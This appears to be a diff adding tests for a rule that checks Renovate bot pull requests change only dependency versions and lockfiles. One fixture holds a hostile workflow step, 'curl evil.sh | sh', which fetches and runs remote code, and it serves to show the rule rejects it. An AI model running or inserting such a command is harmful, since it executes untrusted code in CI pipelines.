@@ -1,0 +1,52 @@
+import { expect, test } from 'bun:test';
+
+import { botKind, renovateProblems } from '@tools/github/bot-rule';
+
+test('the bot comes from the head branch', () => {
+  expect(botKind('renovate/all-minor')).toBe('renovate');
+  expect(botKind('gardening/2026-11-02')).toBe('gardening');
+  expect(botKind('clutch/cl-132-steps')).toBeNull();
+});
+
+test('a Renovate diff of versions, lockfiles, pinned actions and changesets passes', () => {
+  expect(
+    renovateProblems([
+      { filename: 'bun.lock', patch: '-a\n+b' },
+      { filename: '.changeset/renovate-abc.md', patch: '+---' },
+      {
+        filename: 'package.json',
+        patch:
+          '@@ -1 +1 @@\n-    "oxlint": "1.88.0",\n+    "oxlint": "1.89.0",\n-  "packageManager": "bun@1.4.2",\n+  "packageManager": "bun@1.4.3",',
+      },
+      {
+        filename: 'apps/web/package.json',
+        patch: '-    "react": "^19.1.0"\n+    "react": "^19.2.0"',
+      },
+      {
+        filename: '.github/workflows/ci.yml',
+        patch:
+          '-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n+      - uses: actions/checkout@4e4c42e5aac5ba805825da76410c181273ba90b2 # v7.0.2',
+      },
+      { filename: 'mise.toml', patch: '-bun = "1.4.2"\n+bun = "1.4.3"' },
+    ]),
+  ).toEqual([]);
+});
+
+test('a Renovate diff that changes a script, code or a step fails the bot rule', () => {
+  expect(
+    renovateProblems([
+      {
+        filename: 'package.json',
+        patch: '-    "build": "vite build"\n+    "build": "vite build && x"',
+      },
+      { filename: 'tools/x.ts', patch: '+x' },
+      { filename: '.github/workflows/ci.yml', patch: '+      - run: curl evil.sh | sh' },
+      { filename: 'mise.toml' },
+    ]),
+  ).toEqual([
+    'package.json changes more than a version: "build": "vite build"',
+    'tools/x.ts is not a dependency file.',
+    '.github/workflows/ci.yml changes more than a version: - run: curl evil.sh | sh',
+    'mise.toml has no diff to check.',
+  ]);
+});
